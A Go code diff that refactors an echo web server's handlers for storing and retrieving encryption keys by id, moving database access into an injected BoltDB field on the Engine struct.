@@ -1,4 +1,4 @@
-package main
+package web
 
 import (
 	"encoding/json"
@@ -12,37 +12,37 @@ import (
 type Engine struct {
 	*echo.Echo
 	PrivateKey []byte
+	Database   *repository.BoltDB
 }
 
-func NewEngine(privKey []byte) *Engine {
+// NewEngine return a new echo.Echo instance
+func NewEngine() *Engine {
 	return &Engine{
 		Echo:       echo.New(),
-		PrivateKey: privKey,
+		PrivateKey: []byte{},
+		Database:   nil,
 	}
 }
 
-func (e *Engine) addKeys(c echo.Context) error {
+// AddKeys persists a new key pair
+func (e *Engine) AddKeys(c echo.Context) error {
 	// Get the payload from context
 	payload := c.Get("payload").([]byte)
 
 	// Parse the json keys
-	keys, err := parseJsonKeys(payload)
-	if err != nil {
+	var keys map[string]string
+	if err := json.Unmarshal(payload, &keys); err != nil {
 		// Bad Json
 		return c.JSON(http.StatusBadRequest, ApiResponseBadJson)
 	}
 
-	// If nothing goes wrong, persist the keys...
-	db := repository.Open(Database)
-	defer db.Close()
-
-	available, err := db.IsAvailable(keys["id"], "keys")
+	available, err := e.Database.IsAvailable(keys["id"], "keys")
 	if err != nil && err != repository.ErrorBucketNotExists {
 		return c.JSON(http.StatusInternalServerError, ApiResponseInternalError)
 	}
 
 	if available || err == repository.ErrorBucketNotExists {
-		err = db.CreateOrUpdate(keys["id"], keys["enckey"], "keys")
+		err = e.Database.CreateOrUpdate(keys["id"], keys["enckey"], "keys")
 		if err != nil {
 			return c.JSON(http.StatusInternalServerError, "")
 		}
@@ -56,30 +56,18 @@ func (e *Engine) addKeys(c echo.Context) error {
 	return c.JSON(http.StatusConflict, ApiResponseDuplicatedId)
 }
 
-func (e *Engine) getEncryptionKey(c echo.Context) error {
+// GetEncryptionKey retrieves a encryption key for a given id
+func (e *Engine) GetEncryptionKey(c echo.Context) error {
 	id := c.Param("id")
 	if len(id) != 32 {
 		return c.JSON(http.StatusBadRequest, ApiResponseBadRequest)
 	}
 
-	// If nothing goes wrong, try get the encryption key...
-	db := repository.Open(Database)
-	defer db.Close()
-
-	enckey, err := db.Find(id, "keys")
+	// If nothing goes wrong, retrieve the encryption key...
+	enckey, err := e.Database.Find(id, "keys")
 	if err != nil {
 		return c.JSON(http.StatusTeapot, ApiResponseResourceNotFound)
 	}
 
 	return c.JSON(http.StatusOK, fmt.Sprintf(`{"status": 200, "enckey": "%s"}`, enckey))
-}
-
-// Parse the json keys
-func parseJsonKeys(body []byte) (map[string]string, error) {
-	var keys map[string]string
-	if err := json.Unmarshal(body, &keys); err != nil {
-		return keys, err
-	}
-
-	return keys, nil
 }
